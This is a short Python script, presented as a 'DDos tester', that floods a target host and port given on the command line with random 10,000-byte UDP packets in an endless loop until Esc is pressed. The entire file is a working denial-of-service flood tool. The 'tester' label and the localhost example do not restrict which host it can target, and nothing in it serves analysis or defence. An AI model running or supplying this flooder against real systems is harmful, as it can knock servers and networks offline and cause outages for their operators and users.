import socket
import random
import sys
import keyboard 

bytes = random._urandom(10000)

try:
    ip = sys.argv[1]
    port = int(sys.argv[2])
except IndexError:
    print ("DDos tester. \n Syntax: ddt.py [target_host] [target_port] \n Exaple: ddt.py 127.0.0.1 80 \n")
    exit()

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
sent = 0
while True:
    sock.sendto(bytes, (ip,port))
    sent = sent + 1
    print ("Sent %s packet"%(sent), end='\r')
    if keyboard.is_pressed('Esc'):
        break
